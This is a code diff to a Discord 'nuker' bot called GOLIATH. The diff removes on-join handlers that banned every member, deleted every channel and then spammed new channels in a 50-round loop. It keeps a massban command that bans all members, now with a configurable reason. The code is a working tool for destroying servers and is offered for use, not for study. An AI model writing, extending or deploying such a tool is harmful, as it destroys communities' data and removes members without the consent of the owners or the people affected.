@@ -17,9 +17,7 @@ EMBED_TITLE = "Your embed title here"
 EMBED_DESCRIPTION = "Desc here"
 EMBED_FOOTER = "Footer here"
 EMBED_THUMBNAIL = "https://cdn.discordapp.com/attachments/1327921469552070746/1338112843660394556/chudjak-chud.gif?ex=67ce2772&is=67ccd5f2&hm=396c1be63f785bdbf5bad1254a4db10c3ad23d5137ecb1d29de0da7bb056fcc6&"
-AUTOBAN_CONSENT = input("Do you want autoban enabled (massban on bot join) (yes/no) -->")
-AUTONUKE_CONSENT = input("Do you want the autonuke enabled (nuke on bot join) (yes/no) -->")
-
+BAN_REASON = "Ur ban reason here"
 @GOLIATH.event
 async def on_ready():
     Banner = '''
@@ -104,58 +102,12 @@ async def on_guild_channel_create(channel):
                 print(Colorate.Color(Colors.red, f"Error: {e}", True))
         await asyncio.sleep(1.2)
 
-@GOLIATH.command()
-async def autoban(ctx):
-    if AUTOBAN_CONSENT.lower() == 'yes':
-        print(Colorate.Color(Colors.green, "Autoban already enabled", True))
-        return
-    for member in ctx.guild.members:
-        try:
-            await member.ban(reason="Mass ban on bot join")
-            print(Colorate.Color(Colors.red, f"Banned {member.name}", True))
-        except discord.Forbidden:
-            print(Colorate.Color(Colors.red, f"Failed to ban {member.name}", True))
-        await asyncio.sleep(0.2)
-
-@GOLIATH.command()
-async def autonuke(ctx):
-    if AUTONUKE_CONSENT.lower() == 'yes':
-        print(Colorate.Color(Colors.green, "Autonuke already enabled", True))
-        return
-    await nuke(ctx)
-
-@GOLIATH.event
-async def on_guild_join(guild):
-    if AUTOBAN_CONSENT.lower() == 'yes':
-        for member in guild.members:
-            try:
-                await member.ban(reason="Mass ban on bot join")
-                print(Colorate.Color(Colors.red, f"Banned {member.name} in {guild.name}", True))
-            except discord.Forbidden:
-                print(Colorate.Color(Colors.red, f"Failed to ban {member.name} in {guild.name}", True))
-            await asyncio.sleep(0.2)
-    if AUTONUKE_CONSENT.lower() == 'yes':
-        for channel in guild.channels:
-            try:
-                await channel.delete()
-                print(Colorate.Color(Colors.red, f"Deleted channel {channel.name} in {guild.name}", True))
-            except discord.Forbidden:
-                print(Colorate.Color(Colors.red, f"Failed to delete channel {channel.name} in {guild.name}", True))
-            await asyncio.sleep(0.2)
-        for i in range(50):
-            for channel_name in random.sample(CHANNEL_NAMES, len(CHANNEL_NAMES)):
-                try:
-                    await guild.create_text_channel(channel_name)
-                    print(Colorate.Color(Colors.green, f"Created channel {channel_name} in {guild.name}", True))
-                except discord.Forbidden:
-                    print(Colorate.Color(Colors.red, f"Failed to create channel {channel_name} in {guild.name}", True))
-                await asyncio.sleep(0.2)
 
 @GOLIATH.command()
 async def massban(ctx):
     for member in ctx.guild.members:
         try:
-            await member.ban(reason="Mass ban command")
+            await member.ban(reason=BAN_REASON)
             print(Colorate.Color(Colors.red, f"Banned {member.name}", True))
         except discord.Forbidden:
             print(Colorate.Color(Colors.red, f"Failed to ban {member.name}", True))
